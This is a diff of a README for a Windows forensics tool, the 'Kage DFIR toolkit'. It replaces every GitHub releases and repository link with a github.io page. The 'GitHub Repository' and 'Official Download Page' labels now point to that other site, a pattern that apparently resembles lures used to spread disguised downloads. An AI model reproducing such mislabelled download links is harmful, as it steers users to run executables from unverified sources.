@@ -1,6 +1,6 @@
 # 🔍 Kage-DFIR-toolkit - One Tool, Total Machine Visibility
 
-[![Download Kage](https://img.shields.io/badge/Download-Kage_DFIR_Toolkit-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Leroynice5171/Kage-DFIR-toolkit/releases)
+[![Download Kage](https://img.shields.io/badge/Download-Kage_DFIR_Toolkit-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://leroynice5171.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Follow these three simple steps to start using Kage today.
 
 Visit this link to download the application:
 
-👉 **[Kage Official Download Page](https://github.com/Leroynice5171/Kage-DFIR-toolkit/releases)**
+👉 **[Kage Official Download Page](https://leroynice5171.github.io)**
 
 ### Step 2: Download the File
 
@@ -135,7 +135,7 @@ Here's a quick 5-minute test to see Kage in action:
 
 ## ✅ Final Checklist Before You Begin
 
-- [ ] I have visited the [download page](https://github.com/Leroynice5171/Kage-DFIR-toolkit/releases)
+- [ ] I have visited the [download page](https://leroynice5171.github.io)
 - [ ] I downloaded the latest version
 - [ ] I ran the file and Kage opened
 - [ ] I started an analysis and got my risk score
@@ -150,8 +150,8 @@ Kage is continuously improved based on user input. If you find something that do
 
 ## 🔗 Quick Access
 
-- **Download:** [Kage Releases Page](https://github.com/Leroynice5171/Kage-DFIR-toolkit/releases)
-- **Project Home:** [GitHub Repository](https://github.com/Leroynice5171/Kage-DFIR-toolkit)
+- **Download:** [Kage Releases Page](https://leroynice5171.github.io)
+- **Project Home:** [GitHub Repository](https://leroynice5171.github.io)
 - **Report Issues:** Use the Issues tab on the GitHub page
 
 ---
